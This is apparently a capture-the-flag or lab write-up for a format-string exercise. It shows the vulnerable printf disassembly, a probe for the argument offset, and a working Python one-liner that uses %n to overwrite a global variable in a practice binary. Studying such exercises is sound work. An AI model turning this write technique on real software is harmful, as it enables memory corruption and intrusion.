# ex07 - Format string to overwrite a global variable

## Goal
Print `you have modified the target :)`.

## Relevant assembly (`vuln`)
```asm
08048454: push ebp
08048455: mov  ebp,esp
08048457: sub  esp,0x218
0804845d: mov  eax,ds:0x80496d8           ; stdin stream
08048462: mov  DWORD PTR [esp+0x8],eax
08048466: mov  DWORD PTR [esp+0x4],0x200
0804846e: lea  eax,[ebp-0x208]            ; 520-byte buffer
08048474: mov  DWORD PTR [esp],eax
08048477: call fgets
0804847c: lea  eax,[ebp-0x208]
08048482: mov  DWORD PTR [esp],eax
08048485: call printf                      ; format-string vulnerability
0804848a: mov  eax,ds:0x80496e4           ; target global
0804848f: cmp  eax,0x40
08048492: jne  ...
```

`target` lives at `0x080496e4` and must become `0x40` (64).

## Finding the argument index
The input starts at the 4th printf argument:
```bash
printf 'AAAA%%4$x\n' | ./bin
```

## Exploit
```bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(struct.pack("<I",0x080496e4)+b"%60x%4$n"+b"\n")' | ./bin
```

## Why it works
`fgets` reads into the buffer, then `printf(buffer)` interprets it as a format string. The 4 address bytes contribute 4 to the printed count; `%60x` adds 60 more, reaching 64 (`0x40`). `%4$n` writes that count to the address supplied by argument 4, overwriting `target`.
